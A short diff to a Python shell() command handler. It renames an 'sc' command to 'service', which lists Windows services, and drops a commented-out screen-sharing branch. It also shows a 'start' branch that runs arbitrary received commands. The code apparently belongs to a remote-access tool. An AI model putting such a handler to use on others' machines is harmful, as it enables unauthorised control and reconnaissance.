@@ -329,9 +329,9 @@ def shell():
             except:
                 pass
 
-        elif command == 'sc':
+        elif command == 'service':
             try:
-                execute = subprocess.Popen("sc queryex type= service state= all", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                execute = subprocess.run("sc queryex type= service state= all", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
                 result = execute.stdout.decode()+ execute.stderr.decode()
                 #result = result.decode()
@@ -342,13 +342,6 @@ def shell():
         elif command == 'help':
             pass
 
-
-
-       # elif command == 'screenshare':
-        #    try:
-         #       screen_share()
-          #  except:
-           #     pass
         elif command[:5] == 'start':
             try:
                 subprocess.Popen(command[6:], shell=True)
